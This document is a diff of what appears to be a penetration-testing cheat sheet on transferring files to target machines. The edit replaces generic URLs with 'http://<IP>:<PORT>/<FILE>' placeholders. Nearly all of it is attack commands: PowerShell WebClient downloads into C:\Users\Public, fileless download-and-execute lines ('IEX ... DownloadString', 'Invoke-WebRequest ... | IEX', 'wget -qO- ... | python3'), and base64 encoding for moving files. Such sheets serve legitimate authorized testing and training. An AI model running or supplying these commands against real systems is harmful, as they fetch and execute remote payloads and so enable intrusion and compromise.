@@ -19,22 +19,22 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 
 No password
 ```powershell
-(New-Object Net.WebClient).DownloadFile('<FILE URL>','C:\Users\Public\<FILE>')
+(New-Object Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
 ```
 Using Credentials
 ```powershell
-(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('<FILE URL>', 'C:\Users\Public\<FILE>')
+(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFile('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
 **Async (Keep using Powershell while downloading)**  
 
 No password
 ```powershell
-(New-Object Net.WebClient).DownloadFileAsync('<FILE URL>','C:\Users\Public\<FILE>')
+(New-Object Net.WebClient).DownloadFileAsync('http://<IP>:<PORT>/<FILE>','C:\Users\Public\<FILE>')
 ```
 Using Credentials
 ```powershell
-(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('<FILE URL>', 'C:\Users\Public\<FILE>')
+(New-Object Net.WebClient -Property @{Credentials = New-Object System.Net.NetworkCredential('<USER>', '<PASSWORD>')}).DownloadFileAsync('http://<IP>:<PORT>/<FILE>', 'C:\Users\Public\<FILE>')
 ```
 
 </details>
@@ -43,12 +43,12 @@ Using Credentials
 
 Default  
 ```powershell
-IEX (New-Object Net.WebClient).DownloadString('<FILE URL>')
+IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>')
 ```
 
 Pipeline input  
 ```powershell
-(New-Object Net.WebClient).DownloadString('<FILE URL>') | IEX
+(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<FILE>') | IEX
 ```
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
@@ -56,12 +56,12 @@ Pipeline input
 
 Default  
 ```powershell
-Invoke-WebRequest <FILE URL> -OutFile <OUTPUT FILE>
+Invoke-WebRequest http://<IP>:<PORT>/<FILE> -OutFile <OUTPUT FILE>
 ```
 
 ByPass Internet Explorer Error  
 ```powershell
-Invoke-WebRequest <FILE URL> -UseBasicParsing | IEX
+Invoke-WebRequest http://<IP>:<PORT>/<FILE> -UseBasicParsing | IEX
 ```
 
 ByPass SSL/TLS Error  
@@ -282,7 +282,7 @@ cat <FILE> |base64 -w 0;echo
 
 **Decode the File**  
 ```bash
-echo -n '<BASE64STRING>' | base64 -d > <OUTPUTFILE>
+echo -n '<BASE64STRING>' | base64 -d > <OUTPUT FILE>
 ```
 
 **Confirm the MD5 Hashes Match**  
@@ -296,23 +296,23 @@ md5sum <FILE>
 
 **Basic Download**  
 ```bash
-wget <FILE URL>
+wget http://<IP>:<PORT>/<FILE>
 ```
 
 **Download with Custom Filename**  
 ```bash
-wget -O <OUTPUT FILE> <FILE URL>
+wget -O <OUTPUT FILE> http://<IP>:<PORT>/<FILE>
 ```
 
 **Download with Authentication**  
 ```bash
-wget --user=<USER> --password=<PASSWORD> <FILE URL>
+wget --user=<USER> --password=<PASSWORD> http://<IP>:<PORT>/<FILE>
 ```
 
 **Fileless Download**  
 ```bash
 # Executes it directly
-wget -qO- <FILE URL> | python3
+wget -qO- http://<IP>:<PORT>/<FILE> | python3
 ```
 
 </details>
@@ -331,7 +331,7 @@ curl -k -O https://<IP>:<PORT>/<FILE>
 
 **Download with Custom Filename**  
 ```bash
-curl -o <OUTPUT FILE> <FILE URL>
+curl -o <OUTPUT FILE> http://<IP>:<PORT>/<FILE>
 ```
 
 **Download with Authentication**  
